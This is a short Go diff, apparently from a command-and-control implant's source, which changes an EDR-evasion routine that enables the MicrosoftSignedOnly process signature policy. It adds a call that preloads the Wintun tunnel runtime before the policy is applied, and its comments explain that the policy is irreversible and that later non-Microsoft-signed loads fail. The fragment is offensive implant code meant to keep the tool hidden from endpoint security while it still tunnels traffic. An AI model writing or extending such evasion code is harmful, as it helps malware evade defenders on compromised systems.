@@ -17,6 +17,16 @@ func blockDLLs() string {
 	if !pebBlockDLLs {
 		return "PEB BlockDLLs: disabled by EDR strategy"
 	}
+
+	// Load any bundled non-Microsoft-signed runtime the implant may need later
+	// (today: the Wintun TUN runtime, WireGuard LLC-signed) BEFORE the
+	// signature policy below: MicrosoftSignedOnly is irreversible, and the
+	// loader refuses every later non-Microsoft-signed image with
+	// ERROR_INVALID_IMAGE_HASH (577), while an already-loaded module keeps
+	// resolving. Every signature-policy application site must call this first.
+	// Best-effort: builds without the bundle are a silent no-op.
+	preloadWintunBeforeHardening()
+
 	results := ""
 
 	// Method 1: Set ProcessSignaturePolicy (imported from kernel32.dll, NOT ntdll)
